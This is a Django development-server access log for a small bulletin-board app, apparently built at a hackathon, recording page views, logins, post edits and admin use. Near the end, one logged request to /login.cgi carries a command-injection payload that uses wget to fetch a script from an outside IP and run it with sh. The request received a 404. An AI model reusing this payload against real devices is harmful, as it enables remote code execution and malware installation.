[25/Aug/2018 17:17:50] "GET / HTTP/1.1" 200 4019
[25/Aug/2018 17:18:01] "GET /detail/2/ HTTP/1.1" 200 1366
[25/Aug/2018 17:18:07] "GET /detail/12/ HTTP/1.1" 200 1375
[25/Aug/2018 17:18:28] "GET / HTTP/1.1" 200 4019
[25/Aug/2018 17:18:29] "GET / HTTP/1.1" 200 4019
[25/Aug/2018 17:19:11] "GET / HTTP/1.1" 200 4019
[25/Aug/2018 17:19:11] "GET / HTTP/1.1" 200 4019
[25/Aug/2018 17:19:12] "GET / HTTP/1.1" 200 4019
[25/Aug/2018 17:19:12] "GET / HTTP/1.1" 200 4019
[25/Aug/2018 17:19:17] "GET / HTTP/1.1" 200 4019
[25/Aug/2018 17:19:17] "GET / HTTP/1.1" 200 4019
[25/Aug/2018 17:19:18] "GET / HTTP/1.1" 200 4019
[25/Aug/2018 17:19:34] "GET / HTTP/1.1" 200 3931
Not Found: /favicon.ico
[25/Aug/2018 17:19:35] "GET /favicon.ico HTTP/1.1" 404 3792
[25/Aug/2018 17:19:44] "GET /join/ HTTP/1.1" 200 6352
[25/Aug/2018 17:19:51] "GET /login/ HTTP/1.1" 200 3966
[25/Aug/2018 17:19:52] "GET / HTTP/1.1" 200 4019
[25/Aug/2018 17:19:52] "GET / HTTP/1.1" 200 4019
[25/Aug/2018 17:19:59] "POST /login/ HTTP/1.1" 302 0
[25/Aug/2018 17:19:59] "GET /esignin/ HTTP/1.1" 200 103
[25/Aug/2018 17:20:03] "GET /login/ HTTP/1.1" 200 3966
[25/Aug/2018 17:20:08] "POST /login/ HTTP/1.1" 302 0
[25/Aug/2018 17:20:08] "GET /esignin/ HTTP/1.1" 200 103
[25/Aug/2018 17:20:10] "GET /login/ HTTP/1.1" 200 3966
[25/Aug/2018 17:22:39] "GET / HTTP/1.1" 200 3987
[25/Aug/2018 17:22:49] "GET /admin HTTP/1.1" 301 0
[25/Aug/2018 17:22:49] "GET /admin/ HTTP/1.1" 200 3637
[25/Aug/2018 17:22:49] "GET /static/admin/css/base.css HTTP/1.1" 200 16106
[25/Aug/2018 17:22:49] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
[25/Aug/2018 17:22:49] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17894
[25/Aug/2018 17:22:49] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
[25/Aug/2018 17:22:49] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
[25/Aug/2018 17:22:49] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
[25/Aug/2018 17:22:49] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[25/Aug/2018 17:22:49] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
[25/Aug/2018 17:22:49] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[25/Aug/2018 17:22:50] "GET /admin/auth/group/ HTTP/1.1" 200 3599
[25/Aug/2018 17:22:51] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6170
[25/Aug/2018 17:22:51] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:22:51] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
[25/Aug/2018 17:22:51] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6897
[25/Aug/2018 17:22:51] "GET /static/admin/js/core.js HTTP/1.1" 200 7134
[25/Aug/2018 17:22:51] "GET /static/admin/js/actions.js HTTP/1.1" 200 6502
[25/Aug/2018 17:22:51] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8729
[25/Aug/2018 17:22:51] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1538
[25/Aug/2018 17:22:51] "GET /static/admin/img/search.svg HTTP/1.1" 200 458
[25/Aug/2018 17:22:51] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 128820
[25/Aug/2018 17:22:51] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 258648
[25/Aug/2018 17:22:51] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
[25/Aug/2018 17:22:52] "GET /admin/ HTTP/1.1" 200 3637
[25/Aug/2018 17:22:52] "GET /admin/auth/user/ HTTP/1.1" 200 12184
[25/Aug/2018 17:22:52] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:22:52] "GET /static/admin/img/icon-no.svg HTTP/1.1" 200 560
[25/Aug/2018 17:22:52] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
[25/Aug/2018 17:22:52] "GET /static/admin/img/sorting-icons.svg HTTP/1.1" 200 1097
[25/Aug/2018 17:23:00] "GET / HTTP/1.1" 200 3987
[25/Aug/2018 17:23:00] "GET /admin/ HTTP/1.1" 200 3637
[25/Aug/2018 17:23:01] "GET / HTTP/1.1" 200 3987
[25/Aug/2018 17:23:02] "GET / HTTP/1.1" 200 3987
[25/Aug/2018 17:23:04] "GET /detail/11/ HTTP/1.1" 200 1370
[25/Aug/2018 17:23:04] "GET / HTTP/1.1" 200 3899
[25/Aug/2018 17:23:09] "GET /login/ HTTP/1.1" 200 3966
[25/Aug/2018 17:23:10] "GET /detail/8/ HTTP/1.1" 200 1355
[25/Aug/2018 17:23:13] "GET /delete/8 HTTP/1.1" 302 0
[25/Aug/2018 17:23:13] "GET / HTTP/1.1" 200 3681
[25/Aug/2018 17:23:16] "GET /detail/9/ HTTP/1.1" 200 1354
[25/Aug/2018 17:23:16] "GET /join/ HTTP/1.1" 200 6352
[25/Aug/2018 17:23:17] "GET /delete/9 HTTP/1.1" 302 0
[25/Aug/2018 17:23:17] "GET / HTTP/1.1" 200 3376
[25/Aug/2018 17:23:21] "GET /detail/10/ HTTP/1.1" 200 1374
[25/Aug/2018 17:23:30] "GET /update/10 HTTP/1.1" 200 5941
[25/Aug/2018 17:23:49] "POST /join/ HTTP/1.1" 302 0
[25/Aug/2018 17:23:50] "GET / HTTP/1.1" 200 3378
[25/Aug/2018 17:23:58] "GET /new HTTP/1.1" 200 5941
[25/Aug/2018 17:23:58] "POST /update/10 HTTP/1.1" 302 0
[25/Aug/2018 17:23:58] "GET /detail/10/ HTTP/1.1" 200 1374
[25/Aug/2018 17:24:01] "GET /new HTTP/1.1" 200 5941
[25/Aug/2018 17:24:01] "GET / HTTP/1.1" 200 3376
[25/Aug/2018 17:24:03] "GET /detail/10/ HTTP/1.1" 200 1374
[25/Aug/2018 17:24:04] "GET /update/10 HTTP/1.1" 200 5941
[25/Aug/2018 17:24:18] "POST /new HTTP/1.1" 302 0
[25/Aug/2018 17:24:18] "GET /detail/13/ HTTP/1.1" 200 1344
[25/Aug/2018 17:24:20] "GET / HTTP/1.1" 200 3701
[25/Aug/2018 17:24:24] "GET /profile/ HTTP/1.1" 200 424
[25/Aug/2018 17:24:29] "GET /profile/ HTTP/1.1" 200 424
[25/Aug/2018 17:24:31] "GET /profile/ HTTP/1.1" 200 424
[25/Aug/2018 17:24:32] "POST /new HTTP/1.1" 302 0
[25/Aug/2018 17:24:32] "GET /detail/14/ HTTP/1.1" 200 1335
[25/Aug/2018 17:24:35] "GET / HTTP/1.1" 200 3998
[25/Aug/2018 17:24:41] "GET /detail/13/ HTTP/1.1" 200 1346
[25/Aug/2018 17:24:45] "GET /detail/12/ HTTP/1.1" 200 1377
[25/Aug/2018 17:24:51] "GET /admin/ HTTP/1.1" 200 3637
[25/Aug/2018 17:24:55] "GET /admin/auth/user/ HTTP/1.1" 200 12676
[25/Aug/2018 17:24:55] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:24:55] "GET / HTTP/1.0" 200 3908
[25/Aug/2018 17:24:58] "GET /admin/ HTTP/1.1" 200 3637
[25/Aug/2018 17:24:59] "GET /detail/1/ HTTP/1.1" 200 1372
[25/Aug/2018 17:24:59] "GET /admin/board/post/ HTTP/1.1" 200 6672
[25/Aug/2018 17:24:59] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:25:01] "POST /update/10 HTTP/1.1" 302 0
[25/Aug/2018 17:25:01] "GET /admin/board/post/2/change/ HTTP/1.1" 200 5968
[25/Aug/2018 17:25:01] "GET /static/admin/css/forms.css HTTP/1.1" 200 8173
[25/Aug/2018 17:25:01] "GET /detail/10/ HTTP/1.1" 200 1374
[25/Aug/2018 17:25:01] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:25:01] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
[25/Aug/2018 17:25:01] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
[25/Aug/2018 17:25:01] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
[25/Aug/2018 17:25:05] "GET /logout/ HTTP/1.1" 302 0
[25/Aug/2018 17:25:05] "GET / HTTP/1.1" 200 3908
[25/Aug/2018 17:25:06] "GET / HTTP/1.1" 200 3996
[25/Aug/2018 17:25:06] "GET /join/ HTTP/1.1" 200 6352
[25/Aug/2018 17:25:08] "POST /admin/board/post/2/change/ HTTP/1.1" 200 6132
[25/Aug/2018 17:25:08] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:25:10] "POST /admin/board/post/2/change/ HTTP/1.1" 302 0
[25/Aug/2018 17:25:10] "GET /admin/board/post/ HTTP/1.1" 200 6911
[25/Aug/2018 17:25:10] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:25:13] "GET /detail/10/ HTTP/1.1" 200 1374
[25/Aug/2018 17:25:13] "GET /admin/board/post/2/change/ HTTP/1.1" 200 5994
[25/Aug/2018 17:25:13] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:25:14] "GET /update/10 HTTP/1.1" 200 5941
[25/Aug/2018 17:25:15] "POST /admin/board/post/2/change/ HTTP/1.1" 302 0
[25/Aug/2018 17:25:15] "GET /admin/board/post/ HTTP/1.1" 200 6911
[25/Aug/2018 17:25:15] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:25:16] "GET /admin/board/post/1/change/ HTTP/1.1" 200 5976
[25/Aug/2018 17:25:16] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:25:23] "POST /admin/board/post/1/change/ HTTP/1.1" 302 0
[25/Aug/2018 17:25:23] "GET /admin/board/post/ HTTP/1.1" 200 6915
[25/Aug/2018 17:25:23] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:25:25] "GET /update/10 HTTP/1.1" 200 5941
[25/Aug/2018 17:25:25] "GET /admin/board/post/10/change/ HTTP/1.1" 200 5996
[25/Aug/2018 17:25:25] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:25:26] "GET /admin/board/post/ HTTP/1.1" 200 6672
[25/Aug/2018 17:25:26] "GET /admin/board/post/1/change/ HTTP/1.1" 200 6003
[25/Aug/2018 17:25:27] "GET /admin/board/post/ HTTP/1.1" 200 6672
[25/Aug/2018 17:25:27] "GET /admin/board/post/2/change/ HTTP/1.1" 200 5994
[25/Aug/2018 17:25:28] "GET /admin/board/post/ HTTP/1.1" 200 6672
[25/Aug/2018 17:25:29] "GET /admin/board/post/2/change/ HTTP/1.1" 200 5994
[25/Aug/2018 17:25:30] "GET /admin/board/post/ HTTP/1.1" 200 6672
[25/Aug/2018 17:25:30] "GET /admin/ HTTP/1.1" 200 4660
[25/Aug/2018 17:25:34] "GET / HTTP/1.1" 200 4013
[25/Aug/2018 17:25:36] "GET /detail/13/ HTTP/1.1" 200 1344
[25/Aug/2018 17:25:37] "GET /update/13 HTTP/1.1" 200 5941
[25/Aug/2018 17:25:42] "GET /update/10 HTTP/1.1" 200 5941
[25/Aug/2018 17:25:50] "POST /join/ HTTP/1.1" 302 0
[25/Aug/2018 17:25:50] "GET / HTTP/1.1" 200 4021
[25/Aug/2018 17:25:54] "GET /detail/14/ HTTP/1.1" 200 1341
[25/Aug/2018 17:25:55] "GET /delete/14 HTTP/1.1" 302 0
[25/Aug/2018 17:25:55] "GET / HTTP/1.1" 200 3726
[25/Aug/2018 17:26:00] "GET /new HTTP/1.1" 200 5941
[25/Aug/2018 17:26:28] "GET /update/13 HTTP/1.1" 200 5944
[25/Aug/2018 17:26:32] "GET /update/10 HTTP/1.1" 200 5944
[25/Aug/2018 17:26:33] "GET /update/10 HTTP/1.1" 200 5944
[25/Aug/2018 17:26:50] "POST /new HTTP/1.1" 302 0
[25/Aug/2018 17:26:50] "GET /detail/15/ HTTP/1.1" 200 1347
[25/Aug/2018 17:26:53] "GET / HTTP/1.1" 200 4024
Not Found: /detail/14/
[25/Aug/2018 17:26:53] "GET /detail/14/ HTTP/1.1" 404 1732
[25/Aug/2018 17:26:56] "GET / HTTP/1.1" 200 4016
[25/Aug/2018 17:26:57] "GET / HTTP/1.1" 200 4016
[25/Aug/2018 17:26:57] "GET /detail/15/ HTTP/1.1" 200 1339
[25/Aug/2018 17:26:59] "GET /detail/13/ HTTP/1.1" 200 1344
[25/Aug/2018 17:27:04] "POST /update/10 HTTP/1.1" 302 0
[25/Aug/2018 17:27:04] "GET /detail/10/ HTTP/1.1" 200 1375
[25/Aug/2018 17:27:19] "GET /admin HTTP/1.1" 301 0
[25/Aug/2018 17:27:19] "GET /admin/ HTTP/1.1" 200 4660
[25/Aug/2018 17:27:19] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
[25/Aug/2018 17:27:19] "GET /static/admin/css/base.css HTTP/1.1" 200 16106
[25/Aug/2018 17:27:19] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17894
[25/Aug/2018 17:27:19] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
[25/Aug/2018 17:27:19] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
[25/Aug/2018 17:27:19] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
[25/Aug/2018 17:27:19] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
[25/Aug/2018 17:27:19] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[25/Aug/2018 17:27:19] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[25/Aug/2018 17:27:21] "GET /admin/board/post/ HTTP/1.1" 200 6671
[25/Aug/2018 17:27:21] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6170
[25/Aug/2018 17:27:21] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
[25/Aug/2018 17:27:21] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:27:21] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6897
[25/Aug/2018 17:27:21] "GET /static/admin/js/core.js HTTP/1.1" 200 7134
[25/Aug/2018 17:27:21] "GET /static/admin/js/actions.js HTTP/1.1" 200 6502
[25/Aug/2018 17:27:21] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8729
[25/Aug/2018 17:27:21] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1538
[25/Aug/2018 17:27:21] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 128820
[25/Aug/2018 17:27:22] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 258648
[25/Aug/2018 17:27:22] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
[25/Aug/2018 17:27:22] "GET /static/admin/img/sorting-icons.svg HTTP/1.1" 200 1097
[25/Aug/2018 17:27:25] "GET /admin/board/post/10/change/ HTTP/1.1" 200 5998
[25/Aug/2018 17:27:25] "GET /static/admin/css/forms.css HTTP/1.1" 200 8173
[25/Aug/2018 17:27:25] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:27:25] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
[25/Aug/2018 17:27:25] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
[25/Aug/2018 17:27:25] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
[25/Aug/2018 17:27:33] "GET /admin/board/post/ HTTP/1.1" 200 6671
[25/Aug/2018 17:27:37] "GET / HTTP/1.1" 200 4017
[25/Aug/2018 17:27:39] "GET /admin/board/post/11/change/ HTTP/1.1" 200 5988
[25/Aug/2018 17:27:39] "GET /detail/15/ HTTP/1.1" 200 1339
[25/Aug/2018 17:27:39] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:27:44] "GET /admin/board/post/ HTTP/1.1" 200 6671
[25/Aug/2018 17:27:45] "GET /admin/ HTTP/1.1" 200 4660
[25/Aug/2018 17:27:46] "GET /admin/board/post/10/change/ HTTP/1.1" 200 5998
[25/Aug/2018 17:27:46] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:27:47] "GET /admin/board/post/ HTTP/1.1" 200 6671
[25/Aug/2018 17:27:47] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:27:49] "GET /admin/board/post/ HTTP/1.1" 200 6671
[25/Aug/2018 17:27:49] "GET /admin/board/post/13/change/ HTTP/1.1" 200 5978
[25/Aug/2018 17:27:49] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:27:51] "GET /admin/board/post/2/change/ HTTP/1.1" 200 5994
[25/Aug/2018 17:27:51] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:27:57] "GET /admin/board/post/ HTTP/1.1" 200 6671
[25/Aug/2018 17:27:57] "POST /admin/board/post/13/change/ HTTP/1.1" 302 0
[25/Aug/2018 17:27:57] "GET /admin/board/post/ HTTP/1.1" 200 6935
[25/Aug/2018 17:27:57] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:27:58] "GET /admin/board/post/1/change/ HTTP/1.1" 200 6003
[25/Aug/2018 17:27:58] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:28:02] "GET /admin/board/post/ HTTP/1.1" 200 6680
[25/Aug/2018 17:28:03] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:04] "GET /admin/board/post/13/change/ HTTP/1.1" 200 5996
[25/Aug/2018 17:28:04] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:28:18] "GET /detail/13/ HTTP/1.1" 200 1353
[25/Aug/2018 17:28:19] "GET / HTTP/1.1" 200 4034
[25/Aug/2018 17:28:23] "GET /detail/12/ HTTP/1.1" 200 1383
[25/Aug/2018 17:28:23] "GET /admin/board/post/13/change/ HTTP/1.1" 200 5996
[25/Aug/2018 17:28:23] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:28:27] "GET /detail/15/ HTTP/1.1" 200 1347
[25/Aug/2018 17:28:32] "POST /admin/board/post/13/change/ HTTP/1.1" 302 0
[25/Aug/2018 17:28:32] "GET /admin/board/post/ HTTP/1.1" 200 6917
[25/Aug/2018 17:28:33] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:28:33] "GET /detail/10/ HTTP/1.1" 200 1383
[25/Aug/2018 17:28:34] "GET /admin/board/post/13/change/ HTTP/1.1" 200 5987
[25/Aug/2018 17:28:34] "GET /admin/board/post/ HTTP/1.1" 200 6671
[25/Aug/2018 17:28:34] "GET /admin/board/post/ HTTP/1.1" 200 6671
[25/Aug/2018 17:28:34] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:28:36] "GET /admin/board/post/ HTTP/1.1" 200 6671
[25/Aug/2018 17:28:36] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:28:36] "GET /admin/board/post/13/change/ HTTP/1.1" 200 5987
[25/Aug/2018 17:28:36] "GET /admin/board/post/ HTTP/1.1" 200 6671
[25/Aug/2018 17:28:36] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:28:37] "GET /admin/board/post/ HTTP/1.1" 200 6671
[25/Aug/2018 17:28:37] "GET /admin/board/post/10/change/ HTTP/1.1" 200 5998
[25/Aug/2018 17:28:37] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:28:37] "GET /admin/ HTTP/1.1" 200 5349
[25/Aug/2018 17:28:38] "GET /admin/board/post/10/change/ HTTP/1.1" 200 5998
[25/Aug/2018 17:28:38] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:28:39] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:39] "GET /admin/board/post/10/change/ HTTP/1.1" 200 5998
[25/Aug/2018 17:28:39] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
[25/Aug/2018 17:28:40] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:40] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:41] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:41] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:42] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:43] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:43] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:43] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:44] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:44] "GET /profile/ HTTP/1.1" 200 509
[25/Aug/2018 17:28:44] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:45] "GET / HTTP/1.1" 200 4026
[25/Aug/2018 17:28:47] "GET /detail/13/ HTTP/1.1" 200 1353
[25/Aug/2018 17:28:50] "GET /profile/ HTTP/1.1" 200 509
[25/Aug/2018 17:28:53] "GET /profile/ HTTP/1.1" 200 509
[25/Aug/2018 17:28:53] "GET /detail/12/ HTTP/1.1" 200 1375
[25/Aug/2018 17:28:57] "GET /update/12 HTTP/1.1" 200 5944
[25/Aug/2018 17:29:16] "POST /update/12 HTTP/1.1" 302 0
[25/Aug/2018 17:29:16] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:22] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:23] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:23] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:23] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:24] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:24] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:24] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:24] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:24] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:25] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:25] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:25] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:27] "GET / HTTP/1.1" 200 4025
[25/Aug/2018 17:29:37] "GET / HTTP/1.1" 200 4025
[25/Aug/2018 17:29:38] "GET / HTTP/1.1" 200 4025
[25/Aug/2018 17:29:38] "GET / HTTP/1.1" 200 4025
[25/Aug/2018 17:29:40] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:43] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:29:44] "GET /update/12 HTTP/1.1" 200 5944
[25/Aug/2018 17:29:45] "GET / HTTP/1.1" 200 4033
[25/Aug/2018 17:30:01] "POST /update/12 HTTP/1.1" 302 0
[25/Aug/2018 17:30:01] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:30:08] "GET / HTTP/1.1" 200 4057
[25/Aug/2018 17:30:11] "GET / HTTP/1.1" 200 4057
[25/Aug/2018 17:30:12] "GET / HTTP/1.1" 200 4057
[25/Aug/2018 17:30:13] "GET / HTTP/1.1" 200 4057
[25/Aug/2018 17:30:14] "GET / HTTP/1.1" 200 4057
[25/Aug/2018 17:30:16] "GET /detail/13/ HTTP/1.1" 200 1353
[25/Aug/2018 17:30:19] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:30:20] "GET /update/12 HTTP/1.1" 200 5944
Not Found: /detail
[25/Aug/2018 17:30:39] "GET /detail HTTP/1.1" 404 3777
Not Found: /favicon.ico
[25/Aug/2018 17:30:39] "GET /favicon.ico HTTP/1.1" 404 3792
[25/Aug/2018 17:32:10] "GET /new HTTP/1.1" 200 5944
[25/Aug/2018 17:33:03] "GET / HTTP/1.1" 200 3969
Performing system checks...

System check identified no issues (0 silenced).
August 25, 2018 - 17:22:33
Django version 2.0.8, using settings 'Hackathon.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
Performing system checks...

System check identified no issues (0 silenced).
August 25, 2018 - 17:35:00
Django version 2.0.8, using settings 'Hackathon.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
[25/Aug/2018 17:35:53] "GET /new HTTP/1.1" 200 5991
[25/Aug/2018 17:35:56] "GET /detail/12/ HTTP/1.1" 200 1374
[25/Aug/2018 17:35:57] "GET /update/12 HTTP/1.1" 200 5952
Not Found: /login.cgi
[25/Aug/2018 17:36:42] "GET /login.cgi?cli=aa%20aa%27;wget%20http://209.141.33.86/d%20-O%20-%3E%20/tmp/.shinka;sh%20/tmp/.shinka%27$ HTTP/1.1" 404 3877
[25/Aug/2018 17:36:53] "POST /update/12 HTTP/1.1" 302 0
[25/Aug/2018 17:36:53] "GET /detail/12/ HTTP/1.1" 200 1380
[25/Aug/2018 17:36:55] "GET / HTTP/1.1" 200 4024
[25/Aug/2018 17:37:03] "GET /detail/1/ HTTP/1.1" 200 1374
[25/Aug/2018 17:37:08] "GET / HTTP/1.1" 200 4024
[25/Aug/2018 17:37:09] "GET / HTTP/1.1" 200 4024
[25/Aug/2018 17:37:11] "GET /detail/11/ HTTP/1.1" 200 1370
[25/Aug/2018 17:37:12] "GET /update/11 HTTP/1.1" 200 5952
[25/Aug/2018 17:37:21] "GET / HTTP/1.1" 200 3936
